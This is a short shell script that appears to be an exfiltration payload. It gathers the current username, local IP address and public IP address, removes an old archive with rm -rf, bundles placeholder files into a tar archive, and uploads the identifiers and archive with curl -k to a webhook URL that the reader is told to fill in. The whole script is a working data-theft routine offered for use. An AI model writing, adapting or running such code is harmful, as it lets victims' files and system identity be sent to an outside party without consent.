### Get Name, IP Local and IP WORLD and add this data to $Variables
VAR1=$(whoami)
VAR2=$(hostname -I | awk '{print $1}')
VAR3=$(curl icanhazip.com)
### Remove last arhive
rm -rf data.tar.zip
### Add Files to archive
tar -rvf data.tar %file1% %file2% %file3%
### Payload with $VAR1-2-3 and Files.tar (CHANGES %WEBHOOK_URL% TO YOUR WEBHOOK API)
curl -k -F "payload_json={\"content\": \"$VAR1 || $VAR2 || $VAR3\"}" -F "file1=@data.tar" %WEBHOOK_URL%